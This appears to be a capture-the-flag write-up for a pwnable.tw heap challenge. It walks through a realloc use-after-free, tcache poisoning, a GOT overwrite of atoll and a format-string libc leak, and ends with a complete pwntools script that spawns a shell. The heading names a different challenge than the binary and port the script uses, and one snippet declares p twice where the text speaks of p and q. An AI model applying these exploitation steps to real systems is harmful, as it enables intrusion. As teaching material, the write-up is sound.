# pwnable.tw - hacknote

Original challenge link: https://pwnable.tw/challenge/#40

##  Overview

Program is pretty simple, we are given 2 indices/heap pointers. Using those, we can do `realloc(NULL, size)` which is equivalent to `malloc(size)`, a normal realloc with variable size, and finally, `realloc(<some_ptr>, 0)` which is equivalent to `free()`. Size is capped to 120 bytes, which means we are well within tcache bins range.

There is nothing in the code that reflects chunk contents to leak anything meaningful. The vulnerability turned to that although heap pointer was removed from .bss section upon free(), if we chose to realloc, and then gave size 0, it won't remove it, leading to clear case of Use-After-Free. 


## Vulnerability
A bit of tcache info is mentioned [here](../tcache%20notes.md).

When a tcache eligble chunk is freed, two things happen - 
1.  It goes to relevant tcache bin, pops the existing *next pointer (*next is the pointer to next available chunk in that bin), replaces it with current freed chunk address.
2. It goes to the freed chunk, and writes the old *next pointer popped from tcache bin. (It also writes a double free protection key, but not relevant here.)

So the freed chunk places itself at head of the bin's linked list.

If we run this - 
```c
void *p = malloc(20)
void *p = malloc(20)
free(p)
free(q)
```

tcache will have - 
```
Bin Size - 0x20 [2]: q —▸ p —▸ 0
```

But what happens, if after the frees, something modified the value of *q? Lets say we managed to write 0x1337 there, then tcache will be corrupted as after all, its a linked list stored in freed chunks.
```
Bin Size - 0x20 [2]: q —▸ 0x1337 —▸ ????
```

Now tcache is LIFO based, so in next allocation, q gets alloted, and then 0x1337 will get alloted. This is how we will get write primitive, as our input is directly overwritten on that address.


## Goal

The goal is to get a shell, and to do that, we need to leak some addresses and redirect execution to libc. But nothing on heap is printed. Now since there is no PIE, we can overwrite GOT.

`atoll` is the best target for this. If we overwrite it with printf, we can use format string primitive to leak libc.

Now the issue is we need to change atoll from printf to system(), but we cant write again to an alloted chunk, and neither it can be freed/resized cuz of the metadata corruption and other checks in the non heap location.

So we have to make sure we have two atoll pointers in different tcache bins, and both heap pointers in .bss should be empty. That way, we can reuse the other index after leak.


## Exploit

Helper funcs -
```py
def alloc(idx, size, data=b"")
def realloc(idx, size, data=b"")
def free(idx)
```

Step 1: Hijack linked list to point to atoll
```py
alloc(0, 24)    ## Gets alloted addr A
realloc(0, 0)   ## addr A goes into 0x20 tcache bin
realloc(0, 24, p64(exe.got["atoll"]))
```
Now the above realloc(0, 24) calls `realloc(<freed addr A>, 24)`. This does NOT remove the tcache entry as the realloc sees the chunk metadata, which still says it has 24 bytes of space, and just does nothing. 

Tcache will now look like - 
```
Bin Size - 0x20 [2]: A —▸ atoll@got
```

Next up, we do - 
```py
alloc(1, 24)
realloc(1, 40) 
free(1)
```
What happens in the above code is we alloc a 24 byte chunk, which gets allotted as addr A, making the 0x20 bin now pointing directly to atoll@got.

But notice that if we directly free the chunk, it will again go back into head of 0x20 tcache bin. So we modify the size of it before freeing, so it goes into 0x30 size bin.

Next we do - 
```py
realloc(0, 56)
free(0)
```
Now remember that 0th idx was still pointing to freed addr A. If we call free on it directly, it will throw error. We updated the size to 40 of addr A when we did realloc(1, 40), so we choose the next size 56. and free it. Now there is no ptr on .bss and and 0x20 bin points to atoll. i.g. we have a clean slate, and we can just replay the same logic to create atoll pointer in some other bin.


```py
alloc(0, 56)
realloc(0, 0)
realloc(0, 56, p64(exe.got["atoll"]))
alloc(1, 56)  
realloc(1, 72)
free(1)
realloc(0, 88) 
free(0)
```

With this, we have atoll pointers in 0x20 and 0x40 bins. 

Now we simply leak libc with printf - 
```py
alloc(0, 24, p64(exe.plt["printf"]))
p.sendlineafter(b"choice: ", b"1")
p.sendlineafter(b"Index:", b"%9$p")

p.recvuntil(b"0x")
leak = int(p.recvline().strip(),16)
libc.address = leak - 0x1e5760
```
now alloc returned atoll@got address and we just wrote printf plt address at that. The libc offset can be identified using pwndbg by breakpointing at printf call.

Finally, we overwrite atoll with system - 
```py
p.sendlineafter(b"choice: ", b"1")
p.sendlineafter(b"Index:", b"")
p.sendlineafter(b"Size:", b"%55d")
p.sendlineafter(b"Data:", p64(libc.sym.system))
```
Now notice that atoll is overwritten with printf and printf returns number of chars it printed so Index =  `printf("\n")`, which is 1. Size = `printf("%55d")`, which gives us 55 + 1(for \n) = 56, And finally we overwrite the alloted address with system and get the shell!!

## Solve Script
```py
from pwn import *
import time
exe = ELF("./re-alloc_patched")
libc = ELF("./libc.so.6")

context.binary = exe
context.log_level = 'debug'
context.terminal = ['wt.exe', 'wsl.exe', '-d', 'kali-linux']

def conn():
    if args.REMOTE:
        return remote("chall.pwnable.tw", 10106)
    env = {"LD_PRELOAD": libc.path}
    r = None
    if args.GDB:
        r = process([exe.path], env=env)
        gdb.attach(r)
        time.sleep(2)
    else:
        r = process([exe.path])
    return r

p = conn()

def alloc(idx, size, data=b""):
    p.sendlineafter(b"choice: ", b"1")
    p.sendlineafter(b"Index:", str(idx).encode())
    p.sendlineafter(b"Size:", str(size).encode())
    p.sendlineafter(b"Data:", data)

def realloc(idx, size, data=b""):
    p.sendlineafter(b"choice: ", b"2")
    p.sendlineafter(b"Index:", str(idx).encode())
    p.sendlineafter(b"Size:", str(size).encode())
    if p.recv(5) == b"alloc":
        return
    p.sendline(data)

def free(idx):
    p.sendlineafter(b"choice: ", b"3")
    p.sendlineafter(b"Index:", str(idx).encode())


alloc(0, 24)
realloc(0, 0)
realloc(0, 24, p64(exe.got["atoll"]))

alloc(1, 24) 
realloc(1, 40)
free(1)   

realloc(0, 56)
free(0)

#repeat
alloc(0, 56)
realloc(0, 0)
realloc(0, 56, p64(exe.got["atoll"]))
alloc(1, 56)  
realloc(1, 72)
free(1)
realloc(0, 88) 
free(0)
input()

alloc(0, 24, p64(exe.plt["printf"]))

##leak libc
p.sendlineafter(b"choice: ", b"1")
p.sendlineafter(b"Index:", b"%9$p")

p.recvuntil(b"0x")
leak = int(p.recvline().strip(),16)
libc.address = leak - 0x1e5760

log.info(f"libc puts - {hex(libc.sym.puts)}")

p.sendlineafter(b"choice: ", b"1")
p.sendlineafter(b"Index:", b"")
p.sendlineafter(b"Size:", b"%55d")
p.sendlineafter(b"Data:", p64(libc.sym.system))

p.sendlineafter(b"choice: ", b"1")
p.sendlineafter(b"Index:", b"/bin/bash;")

p.interactive()
```